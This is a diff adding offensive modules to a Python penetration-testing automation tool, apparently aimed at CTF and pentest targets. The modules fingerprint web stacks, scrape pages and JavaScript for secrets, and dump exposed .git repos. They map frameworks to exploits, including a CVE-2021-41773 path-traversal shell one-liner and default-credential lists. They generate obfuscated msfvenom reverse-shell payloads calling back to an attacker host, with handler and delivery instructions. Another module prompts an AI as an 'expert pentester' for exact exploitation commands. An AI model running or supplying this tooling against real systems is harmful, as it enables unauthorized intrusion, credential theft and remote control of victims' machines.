@@ -4224,6 +4224,394 @@ def run_mqtt_suite(target, services, outdir, args, tools, loot=None):
     return vulns
 
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# WEB STACK FINGERPRINTING + SOURCE/JS/DIR INTEL + FRAMEWORK EXPLOIT LOOKUP
+# ------------------------------------------------------------------------
+# Passive tech fingerprint (headers/cookies/error-pages/body), HTML source +
+# comment + href harvesting, JavaScript vuln-pattern scan, directory-listing
+# abuse, robots/sitemap, and framework->known-exploit/default-login mapping.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# cookie name (lower) -> stack
+_COOKIE_STACK = {
+    'connect.sid': 'Express/Node.js', 'csrftoken': 'Django', 'sessionid': 'Django',
+    'laravel_session': 'Laravel', 'xsrf-token': 'Laravel/Angular', 'phpsessid': 'PHP',
+    'jsessionid': 'Java (Tomcat/JSP)', 'asp.net_sessionid': 'ASP.NET', 'ci_session': 'CodeIgniter',
+    '_rails_session': 'Ruby on Rails', 'wordpress_logged_in': 'WordPress', 'wp-settings': 'WordPress',
+    'flask': 'Flask', 'session': 'Flask/generic', 'ci_csrf_token': 'CodeIgniter',
+}
+# header (lower) substr -> stack
+_HEADER_STACK = {
+    'express': 'Express/Node.js', 'next.js': 'Next.js', 'php': 'PHP', 'asp.net': 'ASP.NET',
+    'wsgiserver': 'Django (WSGI)', 'werkzeug': 'Flask/Werkzeug', 'gunicorn': 'Python (Gunicorn)',
+    'kestrel': 'ASP.NET Core', 'apache': 'Apache', 'nginx': 'nginx', 'iis': 'IIS',
+    'tomcat': 'Tomcat', 'jetty': 'Jetty', 'openresty': 'nginx/OpenResty', 'phusion': 'Ruby (Passenger)',
+    'drupal': 'Drupal', 'nextjs': 'Next.js',
+}
+# body/error signature -> stack
+_BODY_STACK = [
+    (r'Cannot (GET|POST) /', 'Express/Node.js'),
+    (r'window\.__next_f', 'Next.js (App Router)'),
+    (r'/_next/static/', 'Next.js'),
+    (r'wp-content|wp-includes|/wp-json', 'WordPress'),
+    (r'Joomla!|/media/jui/|com_content', 'Joomla'),
+    (r'Drupal\.settings|/sites/default/files', 'Drupal'),
+    (r'csrfmiddlewaretoken', 'Django'),
+    (r'Whoops, looks like something went wrong|laravel', 'Laravel'),
+    (r'Werkzeug|Traceback \(most recent call last\)', 'Flask/Werkzeug (debug)'),
+    (r'data-reactroot|react(?:-dom)?\.production', 'React'),
+    (r'ng-version=', 'Angular'),
+    (r'X-Grafana|grafana', 'Grafana'),
+]
+# framework/product -> [(user, pass)] default creds
+_FRAMEWORK_DEFAULT_CREDS = {
+    'tomcat': [('tomcat', 'tomcat'), ('admin', 'admin'), ('tomcat', 's3cret')],
+    'jenkins': [('admin', 'admin')], 'wordpress': [('admin', 'admin'), ('admin', 'password')],
+    'grafana': [('admin', 'admin')], 'joomla': [('admin', 'admin')],
+    'gitlab': [('root', '5iveL!fe')], 'zabbix': [('Admin', 'zabbix')],
+    'phpmyadmin': [('root', ''), ('root', 'root')], 'jboss': [('admin', 'admin')],
+    'rabbitmq': [('guest', 'guest')], 'openfire': [('admin', 'admin')],
+}
+# version-keyed known criticals (substring match on "product/version")
+_KNOWN_CVES = [
+    ('apache/2.4.49', 'CVE-2021-41773 path-traversal->RCE:  curl --path-as-is "URL/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data "echo;id"'),
+    ('apache/2.4.50', 'CVE-2021-42013 (double-encoded traversal): %%32%65 bypass'),
+    ('next.js', 'CVE-2025-29927 middleware auth bypass: header  x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'),
+    ('werkzeug', 'Flask debug console RCE if /console PIN weak (Werkzeug debugger)'),
+    ('gitlab', 'check GitLab version vs CVE-2021-22205 (unauth RCE via ExifTool)'),
+    ('tomcat', 'try /manager/html default creds; CVE-2020-1938 Ghostcat (AJP 8009); WAR deploy RCE'),
+    ('drupal', 'Drupalgeddon2 CVE-2018-7600 / CVE-2019-6340 (check version)'),
+    ('phpmyadmin', 'check version for CVE-2018-12613 (LFI->RCE)'),
+    ('wordpress', 'wpscan --enumerate vp,u; check plugin CVEs'),
+]
+# JS source vuln patterns -> description
+# NOTE: these are DETECTION regexes searched against target JS source (never executed here).
+_JS_VULN_PATTERNS = [
+    (r'function\s+\w*merge\w*\([^)]*\)[^{]*\{[^}]*for\s*\(', 'recursive merge() — prototype-pollution candidate'),
+    (r'__proto__|constructor\s*\[\s*["\']prototype', 'prototype access — pollution sink'),
+    (r'\beval\s*\(', 'eval() — code-exec sink'),
+    (r'\.innerHTML\s*=|document\.write\s*\(', 'DOM XSS sink (innerHTML/document.write)'),
+    (r'dangerouslySetInnerHTML', 'React dangerouslySetInnerHTML — XSS sink'),
+    (r'child_process|require\(["\']child_process', 'child_process — command-exec (SSR)'),
+    (r'(api[_-]?key|apikey|secret|token|password|passwd)\s*[:=]\s*["\'][^"\']{6,}', 'hardcoded secret in JS'),
+    (r'(AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_\-]{35}|sk-[A-Za-z0-9]{20,})', 'cloud/API key in JS'),
+]
+_LISTING_DIRS = ['assets', 'uploads', 'files', 'backup', 'backups', 'static', 'images', 'img',
+                 'js', 'css', 'data', 'docs', 'download', 'downloads', 'tmp', 'temp', 'includes',
+                 'admin', 'api', 'config', 'private', '.git']
+
+
+def fingerprint_stack(url, port, outdir, loot=None):
+    """Passive web-stack fingerprint from headers, cookies, error page, and body.
+    Returns {'stack','product','version','signals'}. Uses wappalyzer if installed."""
+    fp = {'stack': set(), 'product': '', 'version': '', 'signals': []}
+    if not shutil.which('curl'):
+        return fp
+    _, head, _ = _run(['curl', '-sikL', '--max-time', '10', url], timeout=15)
+    _, body, _ = _run(['curl', '-skL', '--max-time', '10', url], timeout=15)
+    _, err404, _ = _run(['curl', '-skL', '--max-time', '8', url.rstrip('/') + '/nonexistent_' + str(port)], timeout=12)
+    hl = head.lower()
+    # Server / X-Powered-By version
+    m = re.search(r'(?im)^server:\s*(.+)$', head)
+    if m:
+        fp['signals'].append(f"Server: {m.group(1).strip()}")
+        pm = re.search(r'([A-Za-z][\w.-]*?)/(\d[\w.]*)', m.group(1))
+        if pm:
+            fp['product'], fp['version'] = pm.group(1), pm.group(2)
+    xp = re.search(r'(?im)^x-powered-by:\s*(.+)$', head)
+    if xp:
+        fp['signals'].append(f"X-Powered-By: {xp.group(1).strip()}")
+    for sig, stack in _HEADER_STACK.items():
+        if sig in hl:
+            fp['stack'].add(stack)
+    for ck, stack in _COOKIE_STACK.items():
+        if re.search(r'(?im)^set-cookie:\s*' + re.escape(ck), head):
+            fp['stack'].add(stack)
+            fp['signals'].append(f"cookie {ck} -> {stack}")
+    for pat, stack in _BODY_STACK:
+        if re.search(pat, body + err404, re.I):
+            fp['stack'].add(stack)
+    # meta generator version (WordPress 6.1 etc.)
+    gm = re.search(r'(?i)<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', body)
+    if gm:
+        fp['signals'].append(f"generator: {gm.group(1)}")
+        if not fp['product']:
+            gp = re.search(r'([A-Za-z][\w ]*?)\s*([\d.]+)?$', gm.group(1).strip())
+            if gp:
+                fp['product'] = gp.group(1).strip()
+                fp['version'] = (gp.group(2) or '').strip()
+    # wappalyzer (npm) if present
+    if shutil.which('wappalyzer'):
+        _, wout, _ = _run(['wappalyzer', url], timeout=60)
+        for m2 in re.finditer(r'"name"\s*:\s*"([^"]+)"', wout):
+            fp['stack'].add(m2.group(1))
+    if loot and fp['stack']:
+        loot.add('notes', f"web stack {url}: {', '.join(sorted(fp['stack']))}"
+                 + (f" | {fp['product']} {fp['version']}" if fp['product'] else ''))
+    if fp['stack'] or fp['product']:
+        good(f"stack {url}: {', '.join(sorted(fp['stack'])) or fp['product']} "
+             f"{fp['version']}".strip())
+    (outdir / f'fingerprint_{port}.txt').write_text(
+        f"stack: {sorted(fp['stack'])}\nproduct: {fp['product']} {fp['version']}\n"
+        + '\n'.join(fp['signals']))
+    return fp
+
+
+def harvest_page_intel(url, port, outdir, loot=None):
+    """Fetch a page and mine HTML comments, hrefs/src links, JS files, flags,
+    emails, and 'note/TODO/password'-style leaks from the source."""
+    js_urls, links = set(), set()
+    if not shutil.which('curl'):
+        return js_urls, links
+    _, body, _ = _run(['curl', '-skL', '--max-time', '10', url], timeout=15)
+    if not body:
+        return js_urls, links
+    from urllib.parse import urljoin
+    # HTML comments (often hold creds, TODOs, hidden endpoints, flags)
+    for c in re.findall(r'<!--(.*?)-->', body, re.S):
+        c = c.strip()
+        if c and loot and any(k in c.lower() for k in
+                              ('todo', 'fixme', 'pass', 'user', 'admin', 'key', 'secret', 'note',
+                               'flag', 'http', 'api', 'debug', 'cred', 'login', 'hidden', 'dev')):
+            loot.add('notes', f"HTML comment @{url}: {c[:160]}")
+            good(f"  comment: {c[:120]}")
+    # links + scripts
+    for m in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']', body, re.I):
+        u = m.group(1)
+        full = urljoin(url + '/', u)
+        if u.endswith('.js') or '.js?' in u:
+            js_urls.add(full)
+        elif full.startswith('http') and 'logout' not in full.lower():
+            links.add(full)
+    # flags / emails / creds in source
+    for pat, cat in ((r'(?:HTB|THM|FLAG|flag)\{[^}]+\}', 'flags'),
+                     (r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}', 'usernames')):
+        for v in set(re.findall(pat, body))[:20]:
+            if loot:
+                loot.add(cat, v)
+    if loot:
+        loot.scan_output(body[:40000])
+        for l in sorted(links)[:60]:
+            loot.add('urls', l)
+    if js_urls:
+        (outdir / f'js_files_{port}.txt').write_text('\n'.join(sorted(js_urls)))
+    return js_urls, links
+
+
+def analyze_js(js_urls, outdir, args, loot=None):
+    """Fetch referenced JS files and scan for endpoints, secrets, and known
+    client-side vuln patterns (prototype pollution, eval, DOM-XSS sinks)."""
+    vulns = []
+    if not shutil.which('curl'):
+        return vulns
+    endpoints = set()
+    for ju in sorted(js_urls)[:30]:
+        _, js, _ = _run(['curl', '-skL', '--max-time', '10', ju], timeout=15)
+        if not js:
+            continue
+        for ep in re.findall(r'["\'](/[A-Za-z0-9_./-]{2,}(?:\?[^"\']*)?)["\']', js):
+            if any(x in ep for x in ('/api', '/admin', '/user', '/login', '/upload', '/graphql', '/v1', '/v2')):
+                endpoints.add(ep)
+        for pat, desc in _JS_VULN_PATTERNS:
+            m = re.search(pat, js, re.I)
+            if m:
+                good(f"  JS pattern in {ju.split('/')[-1]}: {desc}")
+                if loot:
+                    loot.add('auth_findings', f"JS ({ju.split('/')[-1]}): {desc} -> {m.group(0)[:80]}")
+                sev = 'high' if any(k in desc for k in ('secret', 'key', 'pollution', 'command')) else 'medium'
+                vulns.append({'port': 0, 'service': 'http', 'product': 'web app', 'version': '',
+                             'desc': f'Client-side {desc} in {ju.split("/")[-1]}', 'cve': '',
+                             'exploit': f'inspect {ju}', 'severity': sev})
+    if endpoints:
+        (outdir / 'js_endpoints.txt').write_text('\n'.join(sorted(endpoints)))
+        good(f"  JS revealed {len(endpoints)} API endpoints")
+        if loot:
+            for e in sorted(endpoints)[:40]:
+                loot.add('urls', f'[js-endpoint] {e}')
+    return vulns
+
+
+def check_dir_listing(base_url, port, extra_dirs, outdir, loot=None):
+    """Detect open directory listings (Index of /) + .git exposure on discovered
+    and common dirs; enumerate and scan listed files for secrets/flags."""
+    vulns = []
+    if not shutil.which('curl'):
+        return vulns
+    from urllib.parse import urljoin
+    dirs = list(dict.fromkeys(list(extra_dirs) + _LISTING_DIRS))
+    for d in dirs[:40]:
+        u = urljoin(base_url.rstrip('/') + '/', d.strip('/') + '/')
+        _, body, _ = _run(['curl', '-skL', '--max-time', '8', u], timeout=12)
+        if re.search(r'Index of /|<title>Directory listing for|autoindex', body, re.I):
+            good(f"  OPEN DIR LISTING: {u}")
+            files = re.findall(r'href=["\']([^"\'?/][^"\']*)["\']', body)
+            if loot:
+                loot.add('auth_findings', f"open directory listing: {u} ({len(files)} entries)")
+                loot.add_step(f"Web: browse open dir {u} for secrets/backups")
+            vulns.append({'port': port, 'service': 'http', 'product': 'web app', 'version': '',
+                         'desc': f'Open directory listing at {u}', 'cve': '',
+                         'exploit': f'wget -r {u}', 'severity': 'medium'})
+            # pull small interesting files and scan them
+            for f in files[:25]:
+                if re.search(r'\.(txt|bak|old|conf|config|cfg|ini|env|yml|yaml|json|sql|log|php~|swp|key|pem|zip|tar|gz)$', f, re.I):
+                    fu = urljoin(u, f)
+                    _, fb, _ = _run(['curl', '-skL', '--max-time', '8', fu], timeout=12)
+                    if fb and loot:
+                        loot.add('files', fu)
+                        loot.scan_output(fb[:20000])
+        # .git exposure
+        if d == '.git':
+            _, gh, _ = _run(['curl', '-skL', '--max-time', '8', urljoin(base_url + '/', '.git/HEAD')], timeout=12)
+            if 'ref:' in gh:
+                good(f"  .git EXPOSED: {base_url}/.git/  (dump with git-dumper)")
+                if loot:
+                    loot.add('auth_findings', f".git repo exposed at {base_url}/.git/")
+                    loot.add('recommend', f"git-dumper {base_url}/.git/ ./gitdump   # recover source + secrets")
+                vulns.append({'port': port, 'service': 'http', 'product': 'git', 'version': '',
+                             'desc': f'Exposed .git repository at {base_url}/.git/', 'cve': '',
+                             'exploit': f'git-dumper {base_url}/.git/ out', 'severity': 'high'})
+    return vulns
+
+
+def fetch_robots_sitemap(base_url, outdir, loot=None):
+    """Parse robots.txt + sitemap.xml for hidden paths -> corpus."""
+    paths = set()
+    if not shutil.which('curl'):
+        return paths
+    for res in ('robots.txt', 'sitemap.xml', '.well-known/security.txt'):
+        _, body, _ = _run(['curl', '-skL', '--max-time', '8', base_url.rstrip('/') + '/' + res], timeout=12)
+        if not body or '<html' in body[:200].lower():
+            continue
+        (outdir / res.replace('/', '_')).write_text(body[:20000])
+        for m in re.finditer(r'(?im)^(?:Disallow|Allow):\s*(\S+)', body):
+            paths.add(m.group(1))
+        for m in re.finditer(r'<loc>([^<]+)</loc>', body):
+            paths.add(m.group(1))
+        if paths and loot:
+            loot.add('notes', f"{res}: {len(paths)} paths")
+            for p in sorted(paths)[:40]:
+                loot.add('urls', f'[{res}] {p}')
+    return paths
+
+
+def framework_exploit_lookup(fp, url, outdir, args, loot=None):
+    """Map an identified stack/version to known exploits, default logins, and a
+    searchsploit lookup — the 'now that I know the framework, what breaks it' step."""
+    vulns = []
+    prodver = f"{fp.get('product', '')}/{fp.get('version', '')}".lower()
+    stacks = ' '.join(fp.get('stack', [])).lower() + ' ' + prodver
+    # known-CVE map
+    for key, note in _KNOWN_CVES:
+        if key in prodver or key in stacks:
+            good(f"  known-exploit: {note}")
+            if loot:
+                loot.add('recommend', f"[exploit] {url}: {note}")
+            vulns.append({'port': 0, 'service': 'http', 'product': fp.get('product', 'web'),
+                         'version': fp.get('version', ''), 'desc': f'Known-vulnerable stack: {note.split(":")[0]}',
+                         'cve': (re.search(r'CVE-\d{4}-\d+', note) or [''])[0] if re.search(r'CVE-\d{4}-\d+', note) else '',
+                         'exploit': note, 'severity': 'high'})
+    # default logins
+    for fw, creds in _FRAMEWORK_DEFAULT_CREDS.items():
+        if fw in stacks:
+            cred_str = ', '.join(f"{u}:{p or '<blank>'}" for u, p in creds)
+            if loot:
+                loot.add('recommend', f"[default-login] {url} ({fw}): try {cred_str}")
+            good(f"  default logins for {fw}: {cred_str}")
+    # searchsploit on product+version
+    if shutil.which('searchsploit') and fp.get('product'):
+        q = f"{fp['product']} {fp.get('version', '')}".strip()
+        _, out, _ = _run(['searchsploit', '--color', '-w'] + q.split(), timeout=30)
+        hits = [l for l in out.splitlines() if 'exploit-db' in l.lower() or 'http' in l.lower()]
+        if hits:
+            (outdir / 'framework_searchsploit.txt').write_text(out)
+            good(f"  searchsploit '{q}': {len(hits)} results")
+            if loot:
+                loot.add('recommend', f"[searchsploit] {q}: {len(hits)} exploit(s) — see framework_searchsploit.txt")
+    return vulns
+
+
+# ── msfvenom payload generation (AI-assisted format + obfuscation) ─────────
+def run_msfvenom(target_os, arch, lhost, lport, outdir, args, loot=None, fp=None):
+    """Generate a reverse-shell payload with msfvenom, picking format/encoder from
+    the detected OS/stack. Obfuscation via shikata_ga_nai + iterations. Payload is
+    written to disk and its handler/usage recorded — only when --lhost is given."""
+    if not shutil.which('msfvenom') or not lhost:
+        if not shutil.which('msfvenom') and loot:
+            loot.add('recommend', "install metasploit for msfvenom payloads")
+        return
+    os_l = (target_os or '').lower()
+    stack = ' '.join((fp or {}).get('stack', [])).lower()
+    # pick payload + format by OS/stack
+    if 'windows' in os_l:
+        payload, fmt, ext = 'windows/x64/meterpreter/reverse_tcp', 'exe', 'exe'
+    elif 'php' in stack:
+        payload, fmt, ext = 'php/reverse_php', 'raw', 'php'
+    elif 'java' in stack or 'tomcat' in stack:
+        payload, fmt, ext = 'java/jsp_shell_reverse_tcp', 'raw', 'jsp'
+    else:
+        payload, fmt, ext = 'linux/x64/meterpreter/reverse_tcp', 'elf', 'elf'
+    outfile = outdir / f'payload_{lport}.{ext}'
+    cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', fmt,
+           '-o', str(outfile)]
+    if ext in ('exe', 'elf'):
+        cmd += ['-e', 'x64/xor_dynamic', '-i', '5']   # light obfuscation/encoding
+    subsection("msfvenom Payload Generation")
+    info(f"msfvenom {payload} -> {outfile.name}")
+    _run(cmd, timeout=120)
+    if outfile.exists() and loot:
+        loot.add('files', f'payload: {outfile}')
+        loot.add('recommend', f"# handler: msfconsole -qx 'use exploit/multi/handler; "
+                 f"set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'")
+        loot.add('recommend', f"# deliver {outfile.name} then execute on target")
+        good(f"  payload written: {outfile}")
+
+
+def ai_block_report(target, services, vulns, loot, args, outdir):
+    """When the pipeline did not obtain a foothold/credential, summarise the exact
+    blockers and (via AI when available) the suggested manual next steps — so the
+    operator knows precisely what to do by hand. The user's explicit ask."""
+    got_cred = bool(getattr(loot, 'valid_creds', []))
+    got_foothold = any(v.get('severity') in ('critical', 'high') for v in vulns)
+    if got_cred:
+        return
+    subsection("Blockers & Suggested Manual Path")
+    blockers = []
+    if not got_cred:
+        blockers.append("No valid credential obtained (AS-REP/spray/brute/reuse exhausted or gated).")
+    if not got_foothold:
+        blockers.append("No confirmed high/critical foothold — likely needs manual web/logic exploitation.")
+    open_web = [p for p, s in services.items() if 'http' in s.get('service', '').lower()]
+    if open_web:
+        blockers.append(f"Web services on {open_web}: check the fingerprint/JS/dir-listing findings for a manual path.")
+    for b in blockers:
+        print(f"    {C.Y}[BLOCKED]{C.Re} {b}")
+        loot.add('recommend', f"[BLOCKED] {b}")
+    # AI-suggested path from everything gathered
+    api_key = getattr(args, 'api_key', '') or None
+    if api_key:
+        ctx = {
+            'target': target,
+            'services': {str(k): v.get('service', '') for k, v in services.items()},
+            'findings': [v.get('desc', '') for v in vulns][:40],
+            'stack_notes': [n for n in getattr(loot, 'notes', []) if 'web stack' in n or 'comment' in n][:20],
+            'auth_findings': getattr(loot, 'auth_findings', [])[:20],
+            'usernames': list(dict.fromkeys(getattr(loot, 'usernames', [])))[:30],
+        }
+        prompt = ("You are an expert pentester. Based ONLY on this recon data, state the single most "
+                  "likely foothold and the EXACT manual commands to try next. Be concrete and terse. "
+                  "If a web framework/version is identified, name the specific exploit/CVE or default login.\n\n"
+                  + json.dumps(ctx, indent=1, default=str))
+        ans = query_ai(prompt, api_key=api_key, timeout=90)
+        if ans:
+            print(f"\n{C.M}{C.Bo}  AI — SUGGESTED MANUAL PATH:{C.Re}")
+            print(ans)
+            (outdir / 'BLOCKERS_AND_NEXT_STEPS.md').write_text(
+                f"# Blockers & Suggested Manual Path — {target}\n\n"
+                + '\n'.join(f"- {b}" for b in blockers) + "\n\n## AI-suggested next steps\n\n" + ans)
+            if loot:
+                loot.add('notes', 'AI suggested manual path -> BLOCKERS_AND_NEXT_STEPS.md')
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -4498,6 +4886,23 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
         shellshock_vulns += run_web_foothold_suite(url, port, pc, outdir, args, tools, loot)
         # Broken-auth / session / cookie / JWT testing (Tier1 passive, Tier2 gated, Tier3 recommend)
         shellshock_vulns += run_auth_suite(url, port, pc, outdir, args, tools, loot)
+        # Web-stack fingerprint + source/JS/dir intel + framework->exploit lookup
+        fp = fingerprint_stack(url, port, outdir, loot)
+        js_urls, _links = harvest_page_intel(url, port, outdir, loot)
+        shellshock_vulns += analyze_js(js_urls, outdir, args, loot)
+        fetch_robots_sitemap(url, outdir, loot)
+        # dirs from gobuster output + crawl corpus paths feed the listing/broken-perm check
+        _dirs = set()
+        _gb = outdir / f'gobuster_{port}.txt'
+        if _gb.exists():
+            _dirs.update(l.split()[0].strip('/') for l in _gb.read_text().splitlines() if l.strip())
+        for _u in pc.get('urls', []):
+            _seg = _u.split('://', 1)[-1].split('/')[1:2]
+            if _seg and _seg[0]:
+                _dirs.add(_seg[0])
+        shellshock_vulns += check_dir_listing(url, port, _dirs, outdir, loot)
+        shellshock_vulns += framework_exploit_lookup(fp, url, outdir, args, loot)
+        p5_context.setdefault('web_fp', {})[port] = fp
 
     # ── Injection & SSRF testing (consume crawler corpus; active-gated) ──
     if web_corpus['params']:
@@ -5158,6 +5563,14 @@ def phase6_analysis(target, services, vulns, outdir, args, api_key=None, loot=No
     # SQLi cheat sheet + OS-keyed privesc hand-off (pentestmonkey unix-privesc-check/GTFOBins)
     emit_sqli_cheatsheet(vulns_sorted, [u for u in getattr(loot, 'urls', []) if '[param]' in u], loot)
     emit_privesc_checklist(os_info, services, loot)
+    # msfvenom payload (only if --lhost given and a foothold/RCE finding exists)
+    if getattr(args, 'lhost', None) and any(
+            any(k in v.get('desc', '').lower() for k in _RCE_KEYWORDS) for v in vulns_sorted):
+        os_name = ' '.join(str(o.get('name', '')) for o in (os_info or []))
+        run_msfvenom(os_name, 'x64', args.lhost, getattr(args, 'lport', None) or '4444',
+                     outdir, args, loot, fp=None)
+    # Blockers + AI-suggested manual path when no foothold/cred was obtained
+    ai_block_report(target, services, vulns_sorted, loot, args, outdir)
 
     # AI Deep Analysis
     ai_response = None
